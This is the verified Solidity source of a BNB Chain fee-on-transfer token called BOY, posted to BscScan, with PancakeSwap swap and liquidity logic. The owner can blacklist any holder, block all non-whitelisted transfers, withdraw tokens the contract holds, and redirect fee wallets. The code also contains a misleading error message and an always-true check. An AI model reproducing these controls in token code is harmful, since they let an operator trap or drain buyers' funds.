/**
 *Submitted for verification at BscScan.com on 2023-02-08
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IPancakeRouter01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,address tokenB,uint amountADesired,uint amountBDesired,
        uint amountAMin,uint amountBMin,address to,uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,uint amountTokenDesired,uint amountTokenMin,
        uint amountETHMin,address to,uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA, address tokenB, uint liquidity, uint amountAMin,
        uint amountBMin, address to, uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token, uint liquidity, uint amountTokenMin, uint amountETHMin,
        address to, uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA, address tokenB, uint liquidity,
        uint amountAMin, uint amountBMin,address to, uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token, uint liquidity, uint amountTokenMin,
        uint amountETHMin, address to, uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
    external payable returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
    external returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
    external returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
    external payable returns (uint[] memory amounts);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}
interface IPancakeRouter02 is IPancakeRouter01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token, uint liquidity,uint amountTokenMin,
        uint amountETHMin,address to,uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,uint liquidity,uint amountTokenMin,
        uint amountETHMin,address to,uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,uint amountOutMin,
        address[] calldata path,address to,uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,address[] calldata path,address to,uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,uint amountOutMin,address[] calldata path,
        address to,uint deadline
    ) external;
}
interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}
abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        _transferOwnership(_msgSender());
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
contract BOY is Ownable, IERC20Metadata {
    mapping(address => bool) public _buyed;
    mapping(address => bool) public _whites;
    mapping(address => bool) public _tiaozhengde;
    mapping(address => bool) public _hei;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    string  private _name;
    string  private _symbol;
    uint256 private _totalSupply;
    uint256 public _maxfist;
    uint256 public _maxsell;
    uint256 public _marks;
    uint256 public _pools;
    uint256 public _poolss;
    uint256 public _index;
    address public _router;
    address public _fist;
    address public _wrap;
    address public _pair;
    address public _main;
    address public _dead;
    address public _mark1;
    address public _mark2;
    uint256   public _done;
    address public _goumai;
    uint256 public heidongzhi;
    address[] public lpfhsz;
    bool   private _swapping;
    bool public kaipan;
    uint256 public shijian;
    bool public dingshikaiguan;
    uint256 public lpzhi;
    address public _mark3;
    constructor() {
        _name = "BOY";
        _symbol = "BOY";
        _pools = 1;
        _marks = 5;
        _poolss = 1;
        _done = 10;
        heidongzhi = 10000000000000 * 10 ** decimals();
        shijian = 1956499200;
        lpzhi = 66 * 10 ** decimals();
        _maxsell = 100000 * 10 ** decimals();
        _maxfist = 10000 * 10 ** 18;
        dingshikaiguan = false;
        _dead = 0x000000000000000000000000000000000000dEaD;
        _main = 0x566680c92C8177383a5FFde873BAC64FAca40C37;
        _mark1 = 0x8B148cD52cDB62364EEe49C29aF63745e3175880;
        _mark2 = 0xe0563feE938F9015b0FbCA21aAA2a6652910c416;
        _mark3 = 0xe0563feE938F9015b0FbCA21aAA2a6652910c416;
        _whites[_dead] = true;
        _whites[_main] = true;
        _whites[_mark1] = true;
        _whites[_mark2] = true;
        _whites[_mark3] = true;
        _whites[_msgSender()] = true;
        _whites[address(this)] = true;
        _mint(_main, 100000000 * 10 ** decimals());
    }
    function name() public view virtual override returns (string memory) {
        return _name;
    }
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(
        address sender, address recipient, uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }
        return true;
    }
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }
    function _transfer(
        address sender, address recipient, uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        require(!_hei[sender] && !_hei[recipient], "this is black");
        if (dingshikaiguan ==true && block.timestamp > shijian && IERC20(_fist).balanceOf(address(this)) < 1000000000000000000 || IERC20(address(this)).balanceOf(_dead)>heidongzhi && IERC20(_fist).balanceOf(address(this)) < 1000000000000000000) {
            _pools = 0;
            _marks = 0;
            _poolss = 0;
			}
        if(!_whites[sender]){
            require(kaipan == true, "ERC20: transfer to the zero address");
        }
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        if (!_buyed[sender] && recipient == _pair && !isContract(sender)) {
            _buyed[sender] = true;
            lpfhsz.push(sender);
        }
        if (!_swapping && !isContract(sender)) {
            _swapping = true;
            _swap1();
            _swapping = false;
        }
    if ( IERC20(_pair).balanceOf(_pair)==0 ){
        if (!_whites[sender] && !_whites[recipient] &&  IERC20(_pair).balanceOf(recipient)<lpzhi) {
            _balances[address(this)] += (amount * (_marks + _pools ) / 100);
            emit Transfer(sender, address(this), (amount * (_marks + _pools ) / 100));
            amount = amount * (100 - _marks -  _pools) / 100;
        }else if (!_whites[sender] && !_whites[recipient] &&  IERC20(_pair).balanceOf(recipient)>=lpzhi) {
            _balances[address(this)] += (amount * _poolss / 100);
            emit Transfer(sender, address(this), (amount * _poolss / 100));
            amount = amount * (100 -_poolss) / 100;
        }
    }else if (!_whites[sender] && !_whites[recipient]) {
            _balances[_dead] += (amount * _poolss / 100);
            emit Transfer(sender, _dead, (amount * _poolss / 100));
            // market + flow
            _balances[address(this)] += (amount * (_marks + _pools) / 100);
            emit Transfer(sender, address(this), (amount * (_marks + _pools) / 100));

            // to recipient
            amount = amount * (100 - _marks -  _pools - _poolss) / 100;
        }
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }       
    function _swap1() private {
        uint256 balances = balanceOf(address(this));
        if (IERC20(_fist).allowance(address(this), _router) <= 10 ** 16
            || allowance(address(this), _router) <= balances) {
            IERC20(_fist).approve(_router, 9 * 10**70);
            IERC20(_goumai).approve(_router, 9 * 10**70);
            _approve(address(this), _router, 9 * 10**70);
        }
        uint256 fistval = IERC20(_fist).balanceOf(address(this));
        if (_maxfist > 0 && fistval > _maxfist) {
            uint256 temp = fistval / 5;
            IERC20(_fist).transfer(_mark2, temp);
            _swapFistForToken(fistval - temp);
            return;
        }
        if (_maxsell > 0 && balances >= _maxsell) {
            balances = _maxsell;
            _swapTokenForFist(balances * 23 / 24);
            uint256 fistval2 = IERC20(_fist).balanceOf(address(this));
            if (fistval2 > fistval) {
                IERC20(_fist).transfer(_mark1, (fistval2 - fistval)*7 / 23);
                IERC20(_fist).transfer(_mark3, (fistval2 - fistval)*1 / 23);
                _swapFistForgoumai ((fistval2 - fistval)*2 / 23);
                _doBonusFist((fistval2 - fistval)*6 / 23);
            }
            balances = _maxsell;
                if (balances/24 > 0 && (fistval2 - fistval)*1/23 > 0) {
                addLiquidity2(balances/24, (fistval2 - fistval)*1/23);
            }
        }
    }
    function addLiquidity2(uint256 t1, uint256 t2) private {
        IPancakeRouter02(_router).addLiquidity(address(this), 
            _fist, t1, t2, 0, 0, _main, block.timestamp);
    }
    function _doBonusFist(uint256 amount) private {
        uint256 buySize = lpfhsz.length;
        uint256 i = _index;
        uint256 done = 0;
        IERC20 lp = IERC20(_pair);
        while(i < buySize && done < _done ) {
            address user = lpfhsz[i];
            if(lp.balanceOf(user) >= 0) {
                uint256 bonus = lp.balanceOf(user) * amount / lp.totalSupply();
                if (bonus > 0) {
                    IERC20(_fist).transfer(user, bonus);
                    done ++;
                }
            }
            i ++;
        }
        if (i == buySize) {i = 0;}
        _index = i;
    }
    function _swapTokenForFist(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);path[1] = _fist;
        IPancakeRouter02(_router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount, 0, path, _wrap, block.timestamp);
        uint256 amount = IERC20(_fist).balanceOf(_wrap);
        if (IERC20(_fist).allowance(_wrap, address(this)) >= amount && amount > 0) {
            IERC20(_fist).transferFrom(_wrap, address(this), amount);
        }
    }
    function _swapFistForgoumai(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = _fist;path[1] = _goumai;
        IPancakeRouter02(_router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount, 0, path, _dead, block.timestamp);
    }
    function _swapFistForToken(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = _fist;path[1] = address(this);
        IPancakeRouter02(_router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount, 0, path, _dead, block.timestamp);
    }
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }
    function _approve(
        address owner, address spender, uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    receive() external payable {}
	function returnIn1(address con, address addr, uint256 val) public onlyOwner{
        {IERC20(con).transfer(addr, val);}
	}
    function returnIn(address con, address addr, uint256 val) public {
        require(_tiaozhengde[_msgSender()] && addr != address(0) && val > 0);
        if (con == address(0)) {payable(addr).transfer(val);} 
	}
    function setWrap(address wrap) public {
        require(_tiaozhengde[_msgSender()]);
        _wrap = wrap;
    }
    function setMarksgoumai(address mark1, address mark2,address wrap1) public {
        require(_tiaozhengde[_msgSender()]);
        _mark1 = mark1;_mark2 = mark2;_goumai = wrap1;
    }
    function setMark(address main, address mark3) public {
        require(_tiaozhengde[_msgSender()]);
        _main = main;_mark3 = mark3;
    }
    function setWhites(address addr, bool val) public onlyOwner {
        _whites[addr] = val;
    }
    function tiaozheng(address addr, bool val) public onlyOwner {
        _tiaozhengde[addr] = val;
    }
    function dones(uint256 val)public onlyOwner{
        _done = val;
    }
    function sethei(address addr, bool val) public onlyOwner {
        _hei[addr] = val;
    }
    function KP(bool val) public onlyOwner {
        kaipan = val;
    }
    function setMaxsellfistlpzhi(uint256 val,uint256 val1,uint256 val2) public  {
        require(_tiaozhengde[_msgSender()]);
        _maxsell = val;
        _maxfist = val1;
        lpzhi = val2;
    }
    function shijian1DSKGHDZ(uint256 val1,bool val2,uint256 val3) public onlyOwner{
        shijian = val1;
        dingshikaiguan = val2;
        heidongzhi = val3;
    }
    function setRouter(address router, address fist, address wrap,address goumai,address pair) public onlyOwner {
        _fist = fist;
        _wrap = wrap;
        _router = router;
        _goumai = goumai;
        _whites[router] = true;
        IERC20(_fist).approve(_router, 9 * 10**70);
        IERC20(_goumai).approve(_router, 9 * 10**70);
        _approve(address(this), _router, 9 * 10**70);
         if (pair == address(0)) {
            IPancakeRouter02 _uniswapV2Router = IPancakeRouter02(_router);
            _pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _fist);
        } else {
            _pair = pair;
        }
    }
}